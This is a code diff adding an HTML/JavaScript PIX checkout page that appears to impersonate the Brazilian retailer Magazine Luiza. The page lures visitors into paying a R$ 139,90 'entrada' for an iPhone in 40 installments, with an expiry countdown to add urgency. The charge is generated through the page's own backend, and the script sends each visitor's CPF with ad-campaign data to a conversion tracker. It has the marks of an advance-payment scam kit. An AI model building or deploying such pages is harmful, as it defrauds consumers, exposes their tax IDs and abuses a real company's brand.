@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento PIX - Magazine Luiza</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
+            background: linear-gradient(135deg, #0066FF 0%, #0052CC 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #0066FF 0%, #0052CC 100%);
+            color: white;
+            padding: 16px;
+            text-align: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .header-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .header-subtitle {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        .product-info {
+            border-bottom: 1px solid #f0f0f0;
+            padding-bottom: 16px;
+            margin-bottom: 16px;
+        }
+
+        .product-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .product-detail {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 4px;
+        }
+
+        .price-section {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 16px;
+        }
+
+        .price-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .price-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .price-label {
+            color: #666;
+        }
+
+        .price-value {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .price-value.green {
+            color: #27AE60;
+        }
+
+        .entry-section {
+            background: #E8F4F8;
+            border-left: 4px solid #27AE60;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 16px;
+        }
+
+        .entry-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #27AE60;
+            margin-bottom: 4px;
+        }
+
+        .entry-value {
+            font-size: 18px;
+            font-weight: 700;
+            color: #27AE60;
+        }
+
+        .entry-expires {
+            font-size: 12px;
+            color: #666;
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .qr-container {
+            background: #f8f9fa;
+            border: 2px dashed #0066FF;
+            border-radius: 8px;
+            padding: 16px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        #qrcode {
+            display: inline-block;
+        }
+
+        .qr-label {
+            font-size: 12px;
+            color: #666;
+            margin-top: 8px;
+        }
+
+        .pix-code-section {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 16px;
+        }
+
+        .pix-code-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #856404;
+            margin-bottom: 8px;
+        }
+
+        .pix-code-input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 12px;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+            background: white;
+            color: #333;
+            resize: none;
+            height: 60px;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .btn {
+            padding: 12px 16px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .btn-primary {
+            background: #0066FF;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #0052CC;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 102, 255, 0.3);
+        }
+
+        .btn-success {
+            background: #27AE60;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: #229954;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(39, 174, 96, 0.3);
+        }
+
+        .btn-success:disabled {
+            background: #bdc3c7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .important-notice {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 16px;
+            font-size: 12px;
+            color: #856404;
+        }
+
+        .important-notice strong {
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .verification-status {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #0066FF;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 4px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            display: none;
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 16px;
+            color: #155724;
+            font-size: 13px;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                border-radius: 0;
+                padding: 16px;
+            }
+
+            .header {
+                padding: 12px;
+            }
+
+            .container {
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-title">Pagamento PIX</div>
+        <div class="header-subtitle">Magazine Luiza</div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="product-info">
+                <div class="product-title" id="productTitle">Carregando...</div>
+                <div class="product-detail" id="productColor"></div>
+                <div class="product-detail" id="productStorage"></div>
+            </div>
+
+            <div class="price-section">
+                <div class="price-row">
+                    <span class="price-label">Valor total:</span>
+                    <span class="price-value" id="totalPrice">R$ 0,00</span>
+                </div>
+                <div class="price-row">
+                    <span class="price-label">Parcelamento:</span>
+                    <span class="price-value green" id="installmentInfo">40x de R$ 0,00</span>
+                </div>
+            </div>
+
+            <div class="entry-section">
+                <div class="entry-title">Valor da entrada (pagar agora):</div>
+                <div class="entry-value">R$ 139,90</div>
+                <div class="entry-expires">
+                    <span>⏱️ Expira em: <span id="expiryTime">14:39</span></span>
+                </div>
+            </div>
+
+            <div class="qr-container">
+                <div id="qrcode"></div>
+                <div class="qr-label">Escaneie o QR Code ou copie o código PIX abaixo</div>
+            </div>
+
+            <div class="pix-code-section">
+                <div class="pix-code-label">Código PIX para copiar:</div>
+                <textarea class="pix-code-input" id="pixCode" readonly></textarea>
+            </div>
+
+            <div class="button-group">
+                <button class="btn btn-primary" onclick="copyPixCode()">📋 COPIAR CÓDIGO PIX</button>
+                <div class="verification-status">
+                    <span class="spinner" id="spinner"></span>
+                    <span id="verificationText">Verificando pagamento automaticamente...</span>
+                </div>
+                <button class="btn btn-success" id="paymentConfirmBtn" onclick="confirmPayment()" disabled>✓ JÁ FIZ O PAGAMENTO</button>
+            </div>
+
+            <div class="important-notice">
+                <strong>⚠️ IMPORTANTE:</strong>
+                Após o pagamento da entrada, você receberá a confirmação do seu parcelamento e as instruções para recebimento do aparelho.
+            </div>
+
+            <div class="success-message" id="successMessage">
+                ✓ Pagamento confirmado! Você será redirecionado em breve...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const DUTTYFY_API_KEY = ''; // Chave removida por segurança
+        const DUTTYFY_API_URL = 'https://api.duttyfy.com.br/v1';
+        const UTMIFY_API_URL = 'https://api.utmify.com.br/api/v1/conversion';
+
+        let pixData = null;
+        let paymentVerified = false;
+        let verificationInterval = null;
+
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                iphone: params.get('iphone') || 'iPhone',
+                cpf: params.get('cpf') || '',
+                parcela: params.get('parcela') || '40',
+                utm_source: params.get('utm_source') || '',
+                utm_medium: params.get('utm_medium') || '',
+                utm_campaign: params.get('utm_campaign') || '',
+                utm_content: params.get('utm_content') || '',
+                utm_term: params.get('utm_term') || ''
+            };
+        }
+
+        function formatCurrency(value) {
+            return new Intl.NumberFormat('pt-BR', {
+                style: 'currency',
+                currency: 'BRL'
+            }).format(value);
+        }
+
+        function updateProductInfo() {
+            const params = getUrlParams();
+            const totalPrice = 6799;
+
+            document.getElementById('productTitle').textContent = params.iphone;
+            document.getElementById('productColor').textContent = 'Cor: Preto';
+            document.getElementById('productStorage').textContent = 'Armazenamento: 256GB';
+            document.getElementById('totalPrice').textContent = formatCurrency(totalPrice);
+
+            const installmentValue = totalPrice / parseInt(params.parcela);
+            document.getElementById('installmentInfo').textContent = `${params.parcela}x de ${formatCurrency(installmentValue)}`;
+        }
+
+        async function generatePix() {
+            try {
+                const params = getUrlParams();
+                const response = await fetch(`/api/trpc/payment.generatePix`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        cpf: params.cpf,
+                        iphone: params.iphone,
+                        parcela: params.parcela
+                    }),
+                    credentials: 'include'
+                });
+
+                if (!response.ok) {
+                    throw new Error('Erro ao gerar PIX');
+                }
+
+                const result = await response.json();
+                pixData = result.result;
+
+                document.getElementById('qrcode').innerHTML = '';
+                QRCode.toCanvas(
+                    document.getElementById('qrcode'),
+                    pixData.qr_code,
+                    {
+                        width: 200,
+                        margin: 0,
+                        color: {
+                            dark: '#000000',
+                            light: '#FFFFFF'
+                        }
+                    }
+                );
+
+                document.getElementById('pixCode').value = pixData.qr_code;
+                updateExpiryTime(pixData.expiresAt);
+                sendToUtmify('waiting_payment', params);
+                startPaymentVerification(pixData.id);
+
+            } catch (error) {
+                console.error('Erro ao gerar PIX:', error);
+                document.getElementById('pixCode').value = 'Erro ao gerar PIX. Tente novamente.';
+            }
+        }
+
+        function updateExpiryTime(expiresAt) {
+            const updateTime = () => {
+                const now = new Date();
+                const expiry = new Date(expiresAt);
+                const diff = expiry - now;
+
+                if (diff <= 0) {
+                    document.getElementById('expiryTime').textContent = 'Expirado';
+                    return;
+                }
+
+                const minutes = Math.floor(diff / 60000);
+                const seconds = Math.floor((diff % 60000) / 1000);
+                document.getElementById('expiryTime').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            };
+
+            updateTime();
+            setInterval(updateTime, 1000);
+        }
+
+        async function verifyPayment(pixId) {
+            try {
+                const response = await fetch(`/api/trpc/payment.verifyPayment`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        pixId: pixId
+                    }),
+                    credentials: 'include'
+                });
+
+                if (!response.ok) {
+                    throw new Error('Erro ao verificar pagamento');
+                }
+
+                const result = await response.json();
+                const data = result.result;
+
+                if (data.status === 'paid') {
+                    paymentVerified = true;
+                    clearInterval(verificationInterval);
+                    
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('verificationText').textContent = 'Pagamento confirmado!';
+                    document.getElementById('successMessage').classList.add('show');
+                    document.getElementById('paymentConfirmBtn').disabled = false;
+
+                    const params = getUrlParams();
+                    sendToUtmify('paid', params);
+
+                    setTimeout(() => {
+                        window.location.href = '/resultado';
+                    }, 3000);
+                }
+
+            } catch (error) {
+                console.error('Erro ao verificar pagamento:', error);
+            }
+        }
+
+        function startPaymentVerification(pixId) {
+            verificationInterval = setInterval(() => {
+                verifyPayment(pixId);
+            }, 5000);
+        }
+
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode');
+            pixCode.select();
+            document.execCommand('copy');
+
+            const btn = document.querySelector('.btn-primary');
+            const originalText = btn.textContent;
+            btn.textContent = '✓ COPIADO!';
+            setTimeout(() => {
+                btn.textContent = originalText;
+            }, 2000);
+        }
+
+        function confirmPayment() {
+            if (paymentVerified) {
+                window.location.href = '/resultado';
+            }
+        }
+
+        async function sendToUtmify(event, params) {
+            try {
+                const payload = {
+                    event: event,
+                    cpf: params.cpf,
+                    iphone: params.iphone,
+                    parcela: params.parcela,
+                    utm_source: params.utm_source,
+                    utm_medium: params.utm_medium,
+                    utm_campaign: params.utm_campaign,
+                    utm_content: params.utm_content,
+                    utm_term: params.utm_term,
+                    timestamp: new Date().toISOString()
+                };
+
+                await fetch(UTMIFY_API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Erro ao enviar para UTMify:', error);
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            updateProductInfo();
+            generatePix();
+        });
+    </script>
+
+    <script>
+        (function() {
+            const script = document.createElement('script');
+            script.src = 'https://cdn.utmify.com.br/tracking.js';
+            script.async = true;
+            document.head.appendChild(script);
+        })();
+    </script>
+</body>
+</html>
